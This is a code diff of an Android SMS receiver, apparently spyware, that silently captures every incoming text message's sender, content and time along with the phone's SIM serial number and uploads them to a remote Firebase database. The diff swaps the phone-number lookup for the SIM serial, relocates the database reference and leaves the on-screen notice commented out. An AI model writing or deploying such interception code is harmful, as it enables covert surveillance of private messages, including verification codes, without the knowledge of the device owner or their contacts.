@@ -2,19 +2,28 @@ package com.example.super_secret;
 
 import android.Manifest;
 import android.content.BroadcastReceiver;
+import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
+import android.database.Cursor;
+import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
 import android.telephony.SmsMessage;
 import android.telephony.TelephonyManager;
 import android.util.Log;
+import android.widget.Toast;
 
 //time format
 import androidx.core.app.ActivityCompat;
+
 import java.text.SimpleDateFormat;
 import java.util.Calendar;
+import java.util.Date;
+
+
+
 import com.google.firebase.database.DatabaseReference;
 import com.google.firebase.database.FirebaseDatabase;
 
@@ -23,23 +32,23 @@ public class MyReceiver extends BroadcastReceiver {
     private static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
     private static final String TAG = "SmsBroadcastReceiver";
     private static String msg, phoneNo = "";
+    private static byte[] userData;
     private static String timeStamp;
+
+    // Write a message to the database
+    FirebaseDatabase database = FirebaseDatabase.getInstance();
+    DatabaseReference myRef = database.getReference().child("users").push();
+
 
     @Override
     public void onReceive(Context context, Intent intent) {
 
-        // Get the instance of the database
-        FirebaseDatabase database = FirebaseDatabase.getInstance();
-
-        // Get access to phone number
+        // get own phone number
         TelephonyManager tMgr = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
         if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
             return;
         }
-        String mPhoneNumber = tMgr.getLine1Number();
-
-        //write to database with phone number as header
-        DatabaseReference myRef = database.getReference().child("SMS History").push();
+        String mPhoneNumber = tMgr.getSimSerialNumber();
 
         // Create a DateFormatter object for displaying date in specified format.
         SimpleDateFormat formatter = new SimpleDateFormat("hh:mm:ss aa dd/MM/yyyy");
@@ -75,15 +84,18 @@ public class MyReceiver extends BroadcastReceiver {
                     //convert millisecond to current time
                     calendar.setTimeInMillis(message[i].getTimestampMillis());
                     timeStamp = formatter.format(calendar.getTime());
+
                 }
 
                 // Uncomment this to display a text popup of the following variables on the phone screen
                 //Toast.makeText(context,"Message: " +msg + "\nNumber: " + phoneNo, Toast.LENGTH_LONG).show();
+
                 myRef.child("Sender").setValue(phoneNo);
                 myRef.child("Message").setValue(msg);
                 myRef.child("Time").setValue(timeStamp);
                 myRef.child("Recipient").setValue(mPhoneNumber);
         }
+
     }
-  }
+}
 }
